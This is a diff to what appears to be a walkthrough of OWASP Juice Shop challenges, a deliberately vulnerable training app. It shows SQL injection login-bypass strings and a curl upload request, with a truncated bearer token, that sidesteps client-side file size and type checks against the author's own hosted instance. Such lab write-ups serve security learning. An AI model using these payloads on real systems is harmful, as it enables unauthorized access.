@@ -317,3 +317,19 @@ Email is easy. Once you have the admin access, you can see it in _Administration
 
 To bypass the password check, we can use a simple SQL injection:
 `jim@juice-sh.op';` or `jim@juice-sh.op'--`
+
+## Upload Size (Improper Input Validation)
+_Upload a file larger than 100 kB._
+
+The file size is validated with JavaScript. We can easily bypass using curl:
+```
+BEARER='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..'
+curl -v -i -X POST -H "Authorization: Bearer $BEARER" -F 'file=@150kb.txt' https://vernjan-juice-shop.herokuapp.com/file-upload
+```
+
+Just make sure the file is not larger than `200 kB` (this is server-side validated).
+
+## Upload Type (Improper Input Validation)
+_Upload a file that has no .pdf or .zip extension._
+
+The same as [Upload Size](#upload-size-improper-input-validation) challenge.
